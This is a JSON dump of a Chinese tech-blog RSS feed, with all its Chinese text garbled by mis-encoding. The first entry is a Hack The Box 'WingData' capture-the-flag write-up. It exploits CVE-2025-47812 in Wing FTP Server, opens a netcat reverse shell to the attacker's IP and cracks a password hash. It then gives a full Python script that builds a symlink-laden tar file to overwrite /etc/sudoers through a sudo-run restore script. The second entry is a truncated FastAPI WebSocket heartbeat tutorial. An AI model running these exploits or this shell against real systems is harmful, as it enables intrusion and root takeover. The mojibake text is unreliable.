{
  "title": "ä¸»é¡µ - åšå®¢å›­",
  "link": "https://www.cnblogs.com/",
  "description": "ä¸»é¡µ - åšå®¢å›­ RSS",
  "entries": [
    {
      "title": "ã€æ¸—é€æµ‹è¯•ã€‘HTB Season10 WingData å…¨è¿‡ç¨‹wp",
      "link": "https://www.cnblogs.com/DSchenzi/p/19625276",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DSchenzi/p/19625276\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 20:05\">\n    <span>ã€æ¸—é€æµ‹è¯•ã€‘HTB Season10 WingData å…¨è¿‡ç¨‹wp</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"wingdata\">WingData</h1>\n<h2 id=\"ä¿¡æ¯æ”¶é›†\">ä¿¡æ¯æ”¶é›†</h2>\n<p><img alt=\"image-20260219182401835\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200443486-1691206510.png\" /></p>\n<p><img alt=\"image-20260219182537800\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444147-1082259586.png\" /></p>\n<p>å¾—åˆ°ä¸€ä¸ªftp.wingdata.htbï¼Œä¹Ÿå°†è¿™ä¸ªåŠ ä¸Š</p>\n<p><img alt=\"image-20260219182636761\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444607-2041651593.png\" /></p>\n<p>Wing FTP Server v7.4.3</p>\n<p>é€šè¿‡æœå¯»cveæ˜¯ CVE-2025-47812</p>\n<h2 id=\"æ¼æ´åˆ©ç”¨cve-2025-47812\">æ¼æ´åˆ©ç”¨ï¼ˆCVE-2025-47812ï¼‰</h2>\n<p><a href=\"https://github.com/4m3rr0r/CVE-2025-47812-poc\" rel=\"noopener nofollow\" target=\"_blank\">4m3rr0r/CVE-2025-47812-poc: Wing FTP Server Remote Code Execution (RCE) Exploit (CVE-2025-47812)</a></p>\n<pre><code class=\"language-kotlin\">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c \"whoami\" -v\n</code></pre>\n<p><img alt=\"image-20260219183211504\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200444925-1620471614.png\" /></p>\n<p><strong>ç„¶ååå¼¹shell</strong></p>\n<pre><code class=\"language-kotlin\">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c \"nc 10.10.16.5 8888 -e /bin/sh\" -v\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre>\n<p><img alt=\"image-20260219183719631\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445289-1452625655.png\" /></p>\n<p>ç„¶ååœ¨<code>/opt/wftpserver/Data/1/users</code>ä¸‹çš„wacky.xmlè·å¾—ç”¨æˆ·åŠ å¯†å‡­æ®</p>\n<p><img alt=\"image-20260219184040177\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200445708-1521256185.png\" /></p>\n<pre><code>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP\n</code></pre>\n<p><strong>çˆ†ç ´hash(WingFTP ä½¿ç”¨SHA256ç®—æ³•ï¼Œå¹¶ä½¿ç”¨ç›å€¼â€œWingFTPâ€ä¸ºåŠ å¯†æ–¹å¼)</strong></p>\n<pre><code class=\"language-kotlin\">hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre>\n<p><img alt=\"image-20260219184927089\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446045-1809595022.png\" /></p>\n<p>å¾—åˆ°å¯†ç <code>!#7Blushing^*Bride5</code></p>\n<p>wacky/c</p>\n<p><strong>ç„¶åsshè¿æ¥</strong></p>\n<p><img alt=\"image-20260219185219510\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446347-1318255688.png\" /></p>\n<p>å¾—åˆ°user.txt</p>\n<h2 id=\"æƒé™æå‡\">æƒé™æå‡</h2>\n<p>å…ˆsudo -lçœ‹ä¸€ä¸‹</p>\n<p><img alt=\"image-20260219185311322\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446644-1829574816.png\" /></p>\n<p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªpyè„šæœ¬</p>\n<p>æˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p>\n<pre><code>cat /opt/backup_clients/restore_backup_clients.py\n</code></pre>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\nimport tarfile\nimport os\nimport sys\nimport re\nimport argparse\n\nBACKUP_BASE_DIR = \"/opt/backup_clients/backups\"\nSTAGING_BASE = \"/opt/backup_clients/restored_backups\"\n\ndef validate_backup_name(filename):\n    if not re.fullmatch(r\"^backup_\\d+\\.tar$\", filename):\n        return False\n    client_id = filename.split('_')[1].rstrip('.tar')\n    return client_id.isdigit() and client_id != \"0\"\n\ndef validate_restore_tag(tag):\n    return bool(re.fullmatch(r\"^[a-zA-Z0-9_]{1,24}$\", tag))\n\ndef main():\n    parser = argparse.ArgumentParser(\n        description=\"Restore client configuration from a validated backup tarball.\",\n        epilog=\"Example: sudo %(prog)s -b backup_1001.tar -r restore_john\"\n    )\n    parser.add_argument(\n        \"-b\", \"--backup\",\n        required=True,\n        help=\"Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, \"\n             \"where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)\"\n    )\n    parser.add_argument(\n        \"-r\", \"--restore-dir\",\n        required=True,\n        help=\"Staging directory name for the restore operation. \"\n             \"Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). \"\n             \"Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1â€“24 characters).\"\n    )\n\n    args = parser.parse_args()\n\n    if not validate_backup_name(args.backup):\n        print(\"[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)\", file=sys.stderr)\n        sys.exit(1)\n\n    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)\n    if not os.path.isfile(backup_path):\n        print(f\"[!] Backup file not found: {backup_path}\", file=sys.stderr)\n        sys.exit(1)\n\n    if not args.restore_dir.startswith(\"restore_\"):\n        print(\"[!] --restore-dir must start with 'restore_'\", file=sys.stderr)\n        sys.exit(1)\n\n    tag = args.restore_dir[8:]\n    if not tag:\n        print(\"[!] --restore-dir must include a non-empty tag after 'restore_'\", file=sys.stderr)\n        sys.exit(1)\n\n    if not validate_restore_tag(tag):\n        print(\"[!] Restore tag must be 1â€“24 characters long and contain only letters, digits, or underscores\", file=sys.stderr)\n        sys.exit(1)\n\n    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)\n    print(f\"[+] Backup: {args.backup}\")\n    print(f\"[+] Staging directory: {staging_dir}\")\n\n    os.makedirs(staging_dir, exist_ok=True)\n\n    try:\n        with tarfile.open(backup_path, \"r\") as tar:\n            tar.extractall(path=staging_dir, filter=\"data\")\n        print(f\"[+] Extraction completed in {staging_dir}\")\n    except (tarfile.TarError, OSError, Exception) as e:\n        print(f\"[!] Error during extraction: {e}\", file=sys.stderr)\n        sys.exit(2)\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n<p>æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªè„šæœ¬ç”Ÿæˆtaræ–‡ä»¶</p>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nç”Ÿæˆæ¶æ„taræ–‡ä»¶çš„æ¼æ´åˆ©ç”¨è„šæœ¬\nä½œç”¨ï¼šæ„é€ åŒ…å«å¤šå±‚ç›®å½•ã€ç¬¦å·é“¾æ¥çš„taræ–‡ä»¶ï¼Œå°è¯•çªç ´è·¯å¾„é™åˆ¶å†™å…¥/etc/sudoers\n\"\"\"\n\nimport tarfile\nimport os\nimport io\nimport sys\n\ndef create_malicious_tar(output_path=\"/tmp/backup_9999.tar\"):\n    \"\"\"\n    åˆ›å»ºæ¶æ„taræ–‡ä»¶ï¼ŒåŒ…å«è·¯å¾„éå†å’Œç¬¦å·é“¾æ¥çš„æ„é€ \n    \n    Args:\n        output_path: ç”Ÿæˆçš„taræ–‡ä»¶ä¿å­˜è·¯å¾„ï¼Œé»˜è®¤/tmp/backup_9999.tar\n    \"\"\"\n    # æ„é€ é•¿ç›®å½•åï¼ˆ247ä¸ªdï¼‰ï¼Œç”¨äºçªç ´è·¯å¾„é•¿åº¦é™åˆ¶\n    long_dir_name = 'd' * 247\n    # ç”¨äºæ„é€ å¤šå±‚ç›®å½•çš„å­—ç¬¦åºåˆ—\n    step_chars = \"abcdefghijklmnop\"\n    current_path = \"\"\n\n    try:\n        # ä»¥å†™æ¨¡å¼æ‰“å¼€taræ–‡ä»¶\n        with tarfile.open(output_path, mode=\"w\") as tar:\n            # å¾ªç¯æ„é€ å¤šå±‚ç›®å½•å’Œç¬¦å·é“¾æ¥\n            for char in step_chars:\n                # 1. åˆ›å»ºé•¿ç›®å½•åçš„ç›®å½•é¡¹\n                dir_info = tarfile.TarInfo(os.path.join(current_path, long_dir_name))\n                dir_info.type = tarfile.DIRTYPE  # æ ‡è®°ä¸ºç›®å½•ç±»å‹\n                tar.addfile(dir_info)\n\n                # 2. åˆ›å»ºæŒ‡å‘è¯¥é•¿ç›®å½•çš„ç¬¦å·é“¾æ¥\n                symlink_info = tarfile.TarInfo(os.path.join(current_path, char))\n                symlink_info.type = tarfile.SYMTYPE  # æ ‡è®°ä¸ºç¬¦å·é“¾æ¥ç±»å‹\n                symlink_info.linkname = long_dir_name  # é“¾æ¥æŒ‡å‘é•¿ç›®å½•\n                tar.addfile(symlink_info)\n\n                # æ›´æ–°å½“å‰è·¯å¾„ï¼Œè¿›å…¥ä¸‹ä¸€å±‚\n                current_path = os.path.join(current_path, long_dir_name)\n\n            # 3. æ„é€ å¤šå±‚ç¬¦å·é“¾æ¥è·¯å¾„ï¼Œç”¨äºè·¯å¾„éå†\n            link_path = os.path.join(\"/\".join(step_chars), \"l\"*254)\n            link_info = tarfile.TarInfo(link_path)\n            link_info.type = tarfile.SYMTYPE\n            link_info.linkname = \"../\" * len(step_chars)  # æ„é€ å›é€€è·¯å¾„\n            tar.addfile(link_info)\n\n            # 4. åˆ›å»ºæŒ‡å‘/etcç›®å½•çš„ç¬¦å·é“¾æ¥ï¼ˆescapeï¼‰\n            escape_info = tarfile.TarInfo(\"escape\")\n            escape_info.type = tarfile.SYMTYPE\n            escape_info.linkname = f\"{link_path}/../../../../../../../etc\"\n            tar.addfile(escape_info)\n\n            # 5. åˆ›å»ºæŒ‡å‘/etc/sudoersçš„ç¡¬é“¾æ¥ï¼ˆsudoers_linkï¼‰\n            sudoers_link_info = tarfile.TarInfo(\"sudoers_link\")\n            sudoers_link_info.type = tarfile.LNKTYPE\n            sudoers_link_info.linkname = \"escape/sudoers\"\n            tar.addfile(sudoers_link_info)\n\n            # 6. å†™å…¥æ¶æ„å†…å®¹åˆ°sudoers_linkï¼ˆè¦†ç›–/etc/sudoersï¼‰\n            malicious_content = b\"wacky ALL=(ALL) NOPASSWD: ALL\\n\"\n            file_info = tarfile.TarInfo(\"sudoers_link\")\n            file_info.type = tarfile.REGTYPE  # æ ‡è®°ä¸ºæ™®é€šæ–‡ä»¶ç±»å‹\n            file_info.size = len(malicious_content)  # æŒ‡å®šæ–‡ä»¶å¤§å°\n            # å°†å†…å®¹å†™å…¥taræ–‡ä»¶\n            tar.addfile(file_info, fileobj=io.BytesIO(malicious_content))\n\n        print(f\"[+] æ¶æ„taræ–‡ä»¶å·²ç”Ÿæˆï¼š{output_path}\")\n    except Exception as e:\n        print(f\"[!] ç”Ÿæˆtaræ–‡ä»¶å¤±è´¥ï¼š{str(e)}\", file=sys.stderr)\n        sys.exit(1)\n\nif __name__ == \"__main__\":\n    # æ”¯æŒè‡ªå®šä¹‰è¾“å‡ºè·¯å¾„ï¼ˆå¯é€‰å‚æ•°ï¼‰\n    if len(sys.argv) &gt; 1:\n        output_tar = sys.argv[1]\n    else:\n        output_tar = \"/tmp/backup_9999.tar\"\n    \n    create_malicious_tar(output_tar)\n</code></pre>\n<p><img alt=\"image-20260219194852389\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200446994-1384173239.png\" /></p>\n<p>å¤åˆ¶è¿™ä¸ªæ¶æ„çš„taræ–‡ä»¶åˆ°sudoæƒé™çš„ç›®å½•ä¸‹</p>\n<pre><code class=\"language-kotlin\">cp backup_9999.tar /opt/backup_clients/backups/\n</code></pre>\n<p>ç„¶åè¿è¡Œè¿™ä¸ªsudoè„šæœ¬</p>\n<pre><code class=\"language-kotlin\">sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil\n</code></pre>\n<p><img alt=\"image-20260219195503275\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447328-614892323.png\" /></p>\n<p>è¿™æ—¶å€™å†å»sudo</p>\n<p><img alt=\"image-20260219200000270\" src=\"https://img2024.cnblogs.com/blog/3588329/202602/3588329-20260219200447643-1483399691.png\" /></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 20:05</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DSchenzi\">dynasty_chenzi</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">48</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "FastAPIå®æˆ˜ï¼šWebSocketé•¿è¿æ¥ä¿æŒä¸å¿ƒè·³æœºåˆ¶ï¼Œä»å…¥é—¨åˆ°å¡«å‘",
      "link": "https://www.cnblogs.com/ymtianyu/p/19625144",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ymtianyu/p/19625144\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 17:05\">\n    <span>FastAPIå®æˆ˜ï¼šWebSocketé•¿è¿æ¥ä¿æŒä¸å¿ƒè·³æœºåˆ¶ï¼Œä»å…¥é—¨åˆ°å¡«å‘</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        æœ¬æ–‡é€šè¿‡å®æˆ˜æ¡ˆä¾‹ï¼Œè¯¦ç»†è®²è§£FastAPIä¸JavaScriptå®ç°WebSocketé•¿è¿æ¥ä¿æŒçš„å¿ƒè·³æœºåˆ¶ï¼ŒåŒ…æ‹¬å‰åç«¯ä»£ç ã€å‚æ•°è°ƒä¼˜å’Œå¸¸è§é™·é˜±ï¼Œå¸®åŠ©ä½ æ‰“é€ ç¨³å®šå¯é çš„åŒå‘é€šä¿¡ã€‚\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<div style=\"margin: 0 auto;\">\n<p style=\"font-size: 16px; color: rgba(93, 109, 126, 1); background-color: rgba(248, 249, 250, 1); padding: 12px 16px; border-radius: 8px; margin: 20px 0;\">ğŸ“Œ æ‘˜è¦ï¼šæœ¬æ–‡é€šè¿‡ä¸€ä¸ªçœŸå®çš„ä¸Šçº¿æ¡ˆä¾‹ï¼Œè¯¦ç»†è®²è§£FastAPIä¸JavaScriptå®ç°WebSocketé•¿è¿æ¥ä¿æŒçš„å¿ƒè·³æœºåˆ¶ã€‚ä½ ä¼šäº†è§£ä¸ºä»€ä¹ˆè¿æ¥ä¼šæ–­ã€å¿ƒè·³åŸç†æ˜¯ä»€ä¹ˆã€å‰åç«¯ä»£ç æ€ä¹ˆå†™ï¼Œä»¥åŠé‚£äº›æ–‡æ¡£é‡Œæ²¡å†™çš„è°ƒä¼˜é™·é˜±ã€‚ç…§ç€åšï¼Œè®©ä½ çš„å®æ—¶é€šä¿¡ç¨³å¦‚è€ç‹—ã€‚</p>\n\n<p style=\"font-size: 16px; margin: 20px 0;\">ä½ æ˜¯ä¸æ˜¯ä¹Ÿé‡åˆ°è¿‡â€”â€”WebSocketè¿æ¥åŠ¨ä¸åŠ¨å°±æ–­å¼€ï¼Œå°¤å…¶æ˜¯åœ¨ç§»åŠ¨ç«¯ï¼Œç”¨æˆ·åˆ‡æ¢ä¸ªWi-Fiæˆ–è€…ç”µæ¢¯é‡Œä¿¡å·æ™ƒä¸€ä¸‹ï¼Œæ¶ˆæ¯å°±æ”¶ä¸åˆ°äº†ï¼ŸğŸ“± ç”¨æˆ·æŠ•è¯‰è¯´â€œAPPæ¶ˆæ¯å»¶è¿Ÿâ€ï¼Œä½ ä¸€æŸ¥æ—¥å¿—ï¼Œæ»¡å±éƒ½æ˜¯<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">WebSocket disconnected</code>ï¼Œç„¶åç–¯ç‹‚é‡è¿ï¼ŒæœåŠ¡å™¨å‹åŠ›å±±å¤§ï¼Œç”¨æˆ·ä½“éªŒç¨€ç¢ã€‚</p>\n<p style=\"font-size: 16px; margin: 20px 0;\">æœ‰äº›é¡¹ç›®å›¾çœäº‹ï¼Œè§‰å¾—WebSocketè¿ä¸Šå°±è¡Œäº†ï¼Œç»“æœçº¿ä¸Šè·‘äº†åŠå¤©ï¼Œè¿ç»´å°å“¥å°±å‘æ¥æŠ¥è­¦ï¼šè¿æ¥æ•°å¿½é«˜å¿½ä½ï¼Œå¾ˆå¤šè¿æ¥å­˜æ´»ä¸åˆ°2åˆ†é’Ÿã€‚æŸ¥æ—¥å¿—ï¼Œå¥½å®¶ä¼™ï¼ŒNginxé»˜è®¤<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">proxy_read_timeout</code> 60ç§’ï¼ŒåŠ ä¸Šç§»åŠ¨ç½‘ç»œè¿è¥å•†ä¼šææ‰é•¿æ—¶é—´æ— æµé‡çš„è¿æ¥ï¼ŒåŒå‘å¤¹å‡»ï¼Œè¿æ¥å…¨æ–­äº†ã€‚ğŸ˜­</p>\n<p style=\"font-size: 16px; margin: 20px 0;\"><strong style=\"color: rgba(186, 55, 42, 1);\">æ ¸å¿ƒç»“è®ºï¼š</strong>WebSocketé•¿è¿æ¥ä¿æŒï¼Œä¸èƒ½é â€œè¿ä¸Šå°±ä¸ç®¡â€ï¼Œå¿…é¡»å¼•å…¥å¿ƒè·³æœºåˆ¶â€”â€”å°±åƒä¸¤ä¸ªäººæ‰“ç”µè¯ï¼Œæ¯éš”ä¸€ä¼šå„¿é—®ä¸€å¥â€œå–‚ï¼Œè¿˜åœ¨å—ï¼Ÿâ€ã€‚ä»Šå¤©æˆ‘å°±æŠŠFastAPIåç«¯ + JavaScriptå‰ç«¯çš„å®Œæ•´å¿ƒè·³å®ç°ï¼Œæ°å¼€äº†æ‰ç¢äº†è®²ç»™ä½ å¬ï¼Œé¡ºä¾¿æŠŠæˆ‘è¸©è¿‡çš„å‘æ ‡çº¢ã€‚</p>\n\n<div style=\"background-color: rgba(240, 247, 255, 1); padding: 16px; border-radius: 8px; margin: 25px 0;\">\n<p style=\"font-size: 18px; font-weight: 600; margin: 0 0 10px;\">ğŸš¦ æœ¬æ–‡è·¯çº¿å›¾</p>\n<div style=\"margin-left: 8px;\">\n<p style=\"margin: 6px 0;\">ğŸ”¹ ä¸ºä»€ä¹ˆWebSocketä¼šæ–­ï¼Ÿâ€”â€” ä¸­é—´ä»¶è¶…æ—¶ã€ç½‘ç»œçŠ¶æ€å˜åŒ–</p>\n<p style=\"margin: 6px 0;\">ğŸ”¹ å¿ƒè·³åŸç†ï¼šping-pong è¿˜æ˜¯ pong-pingï¼Ÿ</p>\n<p style=\"margin: 6px 0;\">ğŸ”¹ FastAPIåç«¯ï¼šæ¥æ”¶å¿ƒè·³æ¶ˆæ¯ + è¶…æ—¶ç®¡ç†</p>\n<p style=\"margin: 6px 0;\">ğŸ”¹ JavaScriptå‰ç«¯ï¼šå®šæ—¶å‘é€å¿ƒè·³ + æ–­çº¿é‡è¿</p>\n<p style=\"margin: 6px 0;\">ğŸ”¹ å®Œæ•´å¯è¿è¡Œä»£ç ç¤ºä¾‹</p>\n<p style=\"margin: 6px 0;\">ğŸ”¹ é‚£äº›å¹´æˆ‘è¸©è¿‡çš„å‘ï¼ˆé—´éš”è®¾ç½®ã€é‡å¤å®šæ—¶å™¨ã€æœåŠ¡ç«¯ä¸»åŠ¨æ–­å¼€ï¼‰</p>\n</div>\n</div>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">ğŸ§  ç¬¬ä¸€éƒ¨åˆ†ï¼šè¿æ¥ä¸ºä»€ä¹ˆä¼šæ–­ï¼Ÿ</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">æŠŠWebSocketæƒ³è±¡æˆä¸€æ¡æ°´ç®¡ï¼Œæ•°æ®å°±æ˜¯æ°´ã€‚å¦‚æœæ°´ç®¡ä¸€ç›´æµæ°´ï¼Œå®ƒå°±ä¸ä¼šå µã€‚ä½†è¦æ˜¯ä½ åŠå¤©ä¸æ”¾æ°´ï¼Œä¸­é—´çš„è·¯ç”±å™¨ã€é˜²ç«å¢™å°±è§‰å¾—â€œå˜¿ï¼Œè¿™ç®¡å­æ˜¯ä¸æ˜¯åºŸå¼ƒäº†ï¼Ÿâ€â€”â€”<strong style=\"color: rgba(186, 55, 42, 1);\">å’”åš“ä¸€åˆ€ç»™ä½ æäº†</strong>ã€‚å°¤å…¶æ˜¯åœ¨ç§»åŠ¨ç½‘ç»œä¸‹ï¼Œè¿è¥å•†çš„NATç½‘å…³ç©ºé—²è¶…æ—¶å¯èƒ½åªæœ‰30ç§’åˆ°å‡ åˆ†é’Ÿã€‚è¿˜æœ‰æˆ‘ä»¬å¸¸ç”¨çš„Nginxï¼Œé»˜è®¤<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">proxy_read_timeout</code>æ˜¯60ç§’ï¼Œä¸€æ—¦60ç§’å†…æ²¡æœ‰æ•°æ®ä»åç«¯å‘åˆ°å®¢æˆ·ç«¯ï¼ŒNginxå°±ä¼šè‡ªä½œä¸»å¼ æ–­å¼€è¿æ¥ã€‚</p>\n<p style=\"font-size: 16px; margin: 20px 0;\">æ‰€ä»¥ï¼Œè¦æƒ³è®©è¿æ¥é•¿å­˜ï¼Œå”¯ä¸€çš„æ–¹æ³•å°±æ˜¯<strong style=\"color: rgba(186, 55, 42, 1);\">å®šæœŸå‘é€ä¸€äº›â€œæ— ç”¨â€çš„æ•°æ®</strong>ï¼Œå‘Šè¯‰ä¸­é—´ä»¶ï¼šâ€œæˆ‘è¿˜æ´»ç€ï¼Œåˆ«ç æˆ‘ï¼â€â€”â€”è¿™å°±æ˜¯å¿ƒè·³ã€‚</p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">ğŸ’“ ç¬¬äºŒéƒ¨åˆ†ï¼šå¿ƒè·³æœºåˆ¶çš„ä¸¤ç§å§¿åŠ¿</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">å¿ƒè·³æœ¬è´¨æ˜¯ä¸€ç§<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">ping/pong</code>æ¨¡å¼ã€‚WebSocketåè®®æœ¬èº«æœ‰æ§åˆ¶å¸§<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">Ping</code>å’Œ<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">Pong</code>ï¼Œä½†æµè§ˆå™¨åŸç”ŸJSçš„WebSocket APIå¹¶æ²¡æœ‰ç›´æ¥æš´éœ²å‘é€Pingå¸§çš„æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬ç”¨æ™®é€šæ¶ˆæ¯æ¨¡æ‹Ÿï¼š</p>\n<div style=\"margin-left: 8px;\">\n<p style=\"margin: 6px 0;\">âœ¨ æ–¹æ¡ˆAï¼šå®¢æˆ·ç«¯å®šæ—¶å‘é€<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">ping</code>æ¶ˆæ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°åç«‹å³å›å¤<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">pong</code>ã€‚</p>\n<p style=\"margin: 6px 0;\">âœ¨ æ–¹æ¡ˆBï¼šæœåŠ¡å™¨å®šæ—¶å‘é€<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">ping</code>ï¼Œå®¢æˆ·ç«¯å›å¤<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">pong</code>ã€‚ä½†åŒæ ·ï¼Œå®¢æˆ·ç«¯éœ€è¦èƒ½è§£æå¹¶å›å¤ã€‚</p>\n</div>\n<p style=\"font-size: 16px; margin: 20px 0;\">æ›´å¸¸è§çš„åšæ³•æ˜¯<strong style=\"color: rgba(186, 55, 42, 1);\">å®¢æˆ·ç«¯ä¸»åŠ¨å‘å¿ƒè·³ï¼ŒæœåŠ¡å™¨åªéœ€å“åº”æˆ–è®°å½•</strong>ã€‚ä¸ºå•¥ï¼Ÿå› ä¸ºå®¢æˆ·ç«¯æ›´èƒ½æ„ŸçŸ¥ç½‘ç»œå˜åŒ–ï¼Œä¸”æ–­å¼€åèƒ½ç«‹å³é‡è¿ã€‚ä¸‹é¢æˆ‘å°±ä»¥å®¢æˆ·ç«¯å‘å¿ƒè·³ä¸ºä¾‹ï¼Œä¸Šä»£ç ã€‚</p>\n<h2 style=\"font-size: 22px; font-weight: 600; margin: 30px 0 15px; padding-bottom: 6px;\">âš™ï¸ ç¬¬ä¸‰éƒ¨åˆ†ï¼šFastAPIåç«¯å®æˆ˜</h2>\n<p style=\"font-size: 16px; margin: 20px 0;\">å…ˆæ­ä¸€ä¸ªæœ€ç®€å•çš„FastAPI WebSocketç«¯ç‚¹ã€‚è¿™é‡Œæˆ‘ç”¨äº†<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">/ws</code>è·¯å¾„ï¼Œæ¥æ”¶å¿ƒè·³æ¶ˆæ¯ï¼ˆçº¦å®šJSONæ ¼å¼<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">{\"type\": \"ping\"}</code>ï¼‰ï¼Œå¹¶å›å¤<code style=\"background-color: rgba(246, 248, 250, 1); color: rgba(186, 55, 42, 1); padding: 2px 4px; border-radius: 4px;\">{\"type\": \"pong\"}</code>ã€‚åŒæ—¶ï¼Œä¸ºäº†åŠæ—¶æ¸…ç†æ­»è¿æ¥ï¼Œæˆ‘ä¼šè®°å½•æ¯ä¸ªè¿æ¥çš„æœ€åå¿ƒè·³æ—¶é—´ï¼Œå¯åŠ¨ä¸€ä¸ªåå°ä»»åŠ¡æ£€æŸ¥è¶…æ—¶ï¼ˆæ¯”å¦‚60ç§’æ²¡æ”¶åˆ°å¿ƒè·³å°±ä¸»åŠ¨closeï¼‰ã€‚</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI, WebSocket, WebSocketDisconnect\nimport asyncio\nimport json\nfrom datetime import datetime, timedelta\n\napp = FastAPI()\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: dict[WebSocket, datetime] = {}\n        self._heartbeat_check_interval = 30   # æ¯30ç§’æ£€æŸ¥ä¸€æ¬¡\n        asyncio.create_task(self.heartbeat_checker())\n\n    async def connect(self, websocket: WebSocket):\n        await websocket.accept()\n        self.active_connections[websocket] = datetime.utcnow()\n        print(f\"æ–°è¿æ¥åŠ å…¥ï¼Œå½“å‰è¿æ¥æ•°ï¼š{len(self.active_connections)}\")\n\n    def disconnect(self, websocket: WebSocket):\n        if websocket in self.active_connections:\n            del self.active_connections[websocket]\n            print(f\"è¿æ¥æ–­å¼€ï¼Œå½“å‰è¿æ¥æ•°ï¼š{len(self.active_connections)}\")\n\n    async def handle_messages(self, websocket: WebSocket):\n        try:\n            while True:\n                data = await websocket.receive_text()\n                try:\n                    msg = json.loads(data)\n                except:\n                    continue\n                # å¦‚æœæ˜¯å¿ƒè·³pingï¼Œæ›´æ–°æœ€åå¿ƒè·³æ—¶é—´å¹¶å›å¤pong\n                if msg.get(\"type\") == \"ping\":\n                    self.active_connections[websocket] = datetime.utcnow()\n                    await websocket.send_text(json.dumps({\"type\": \"pong\"}))\n                else:\n                    # å…¶ä»–ä¸šåŠ¡æ¶ˆæ¯ï¼ŒæŒ‰éœ€å¤„ç†\n                    await websocket.send_text(json.dumps({\"type\": \"echo\", \"data\": msg}))\n        except WebSocketDisconnect:\n            self.disconnect(websocket)\n\n    async def heartbeat_checker(self):\n        while 